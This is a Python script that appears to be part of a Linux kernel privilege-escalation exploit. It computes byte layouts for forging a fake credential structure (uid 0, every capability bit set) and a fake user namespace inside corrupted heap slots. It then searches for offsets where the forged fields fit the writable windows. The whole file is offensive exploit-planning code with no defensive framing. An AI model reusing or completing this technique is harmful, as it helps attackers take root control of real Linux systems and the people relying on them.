# Byte-level feasibility for the unified F pattern (neighbour psl slot) + O (victim slot).
# Model: each byte in [0x18,0xf8) is either a required value (per-byte) or free.
# Sources = 14 windows of 16 bytes at 0x18+16k.
WLO, WHI = 0x18, 0xf8
SELF = ('self',)   # cred usage|uid == V (runtime), nonzero

def cred_bytes(v):
    """dict slot-offset -> required value byte, for cred at slot offset v."""
    req = {}
    def put(off, size, val):
        for i in range(size):
            req[off+i] = (val >> (8*i)) & 0xff if isinstance(val, int) else val
    put(v+0x00, 4, SELF)          # usage = low32(V), nonzero
    put(v+0x04, 4, 0xff)          # high32 = 0xffffff80 (bytes 0x80,ff,ff,ff)
    req[v+0x04] = 0x80
    # gid suid sgid : free
    req[v+0x14] = 0               # euid  (free 0x0c..0x14, 0x18)
    req[v+0x1c] = 0               # fsuid
    put(v+0x24, 4, 0)             # securebits
    put(v+0x2c, 4, 0)             # cap_inh
    for a in (0x30,0x38,0x40,0x48):  # caps -> ~0
        put(v+a, 8, 0xffffffffffffffff)
    put(v+0x50, 0x28, 0)          # 4 keyrings + unknown 8B = 0
    for p in range(5):            # security,user,user_ns,ucounts,group_info
        for i in range(8):
            req[v+0x78+8*p+i] = ('ptr', p, i)
    # rcu [0xa0,0xb0) free
    return req

# hard ns fields: (offset, size, value-or-token)
def ns_fields(u):
    f = []
    f.append((u+0x00, 4, 1))          # uid_map.nr_extents
    f.append((u+0x08, 4, 0))          # extent[0].first
    f.append((u+0x0c, 4, 0))          # lower_first
    f.append((u+0x10, 4, 1))          # count
    f.append((u+0x48, 4, 1))          # gid_map.nr_extents
    f.append((u+0x50, 4, 0))          # gid extent first
    f.append((u+0x54, 4, 0))          # lower
    f.append((u+0x58, 4, 1))          # count
    f.append((u+0xd8, 8, 0))          # parent = NULL
    f.append((u+0x104, 4, 0x40000000))# ns.count positive
    f.append((u+0x210, 8, 0))         # ucounts = NULL
    return f

def place(req, off, size, val, out):
    """Try to require bytes at absolute O-relative offset off."""
    for i in range(size):
        a = off + i
        b = (val >> (8*i)) & 0xff if isinstance(val, int) else val
        s = a & 0xff
        if a < 0x100:
            # direct write into O
            if s < WLO or s >= WHI:
                return False
            if s in req and req[s] != b:
                return False
            req[s] = b
        else:
            if s < WLO or s >= WHI:
                return False          # header/tail of neighbour slot: unwritable
            if s in req and req[s] != b:
                return False
            req[s] = b
    return True

res = []
for v in range(0x18, 0x49, 8):
    cr = cred_bytes(v)
    if max(cr) >= WHI: continue
    for u in range(0x10, 0xf0, 8):
        req = dict(cr)
        ok = True
        for (off, size, val) in ns_fields(u):
            if not place(req, off, size, val, req):
                ok = False; break
        if not ok: continue
        # slot index reach: max absolute ns offset = u+0x218 -> slot (u+0x218)>>8
        smax = (u + 0x218) >> 8
        # distinctness windows
        wins = []
        zeros = []
        for k in range(14):
            a = 0x18 + 16*k
            toks = [req.get(a+i) for i in range(16)]
            nfree = sum(1 for t in toks if t is None)
            if nfree == 0 and all(t == 0 for t in toks):
                zeros.append(a)
            wins.append((a, toks, nfree))
        if len(zeros) > 1: continue
        # windows with no free byte must be pairwise distinct
        seen = set(); dup = False
        for (a, toks, nfree) in wins:
            if nfree: continue
            t = tuple(toks)
            if t in seen: dup = True
            seen.add(t)
        if dup: continue
        res.append((v, u, smax, zeros))

print("candidates:", len(res))
for v,u,smax,z in res[:60]:
    print("v=%#x u=%#x smax=%d zero=%s" % (v,u,smax,[hex(x) for x in z]))
